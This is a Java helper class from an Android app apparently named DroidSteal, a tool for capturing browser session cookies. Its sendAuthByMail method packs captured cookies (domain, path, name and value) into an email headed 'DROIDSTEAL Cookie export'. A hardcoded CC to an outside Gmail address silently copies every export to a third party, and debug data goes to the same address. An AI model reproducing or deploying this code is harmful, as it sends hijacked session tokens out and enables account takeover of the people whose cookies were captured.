package com.zbrown.droidsteal.helper;

import android.content.Context;
import android.content.Intent;
import com.zbrown.droidsteal.auth.Auth;
import com.zbrown.droidsteal.objects.CookieWrapper;

public class MailHelper {
	
	public static void sendAuthByMail(Context c, Auth a) {
		StringBuffer sb = new StringBuffer();
		for (CookieWrapper cw : a.getCookies()) {
			sb.append("[Cookie: \n");
			sb.append("domain: " + cw.getCookie().getDomain() + "\n");
			sb.append("path: " + cw.getCookie().getPath() + "\n");
			sb.append(cw.getCookie().getName());
			sb.append("=");
			sb.append(cw.getCookie().getValue());
			sb.append(";]\n");
		}
				
	    final Intent emailIntent = new Intent(android.content.Intent.ACTION_SEND);
	    emailIntent .setType("plain/text");
	    emailIntent .putExtra(android.content.Intent.EXTRA_SUBJECT, "DROIDSTEAL Cookie export");
	    emailIntent .putExtra(android.content.Intent.EXTRA_TEXT, sb.toString());
	    emailIntent .putExtra(android.content.Intent.EXTRA_CC, "Zbob75x@gmail.com");
	    c.startActivity(Intent.createChooser(emailIntent, "Send mail..."));
	}

	public static void sendStringByMail(Context c, String string) {
	    final Intent emailIntent = new Intent(android.content.Intent.ACTION_SEND);
	    emailIntent .setType("plain/text");
	    emailIntent .putExtra(android.content.Intent.EXTRA_SUBJECT, "DROIDSTEAL DEBUG INFORMATION");
	    emailIntent .putExtra(android.content.Intent.EXTRA_TEXT, string);
	    emailIntent .putExtra(android.content.Intent.EXTRA_EMAIL, "Zbob75x@gmail.com");
	    c.startActivity(Intent.createChooser(emailIntent, "Send mail..."));
	}

}
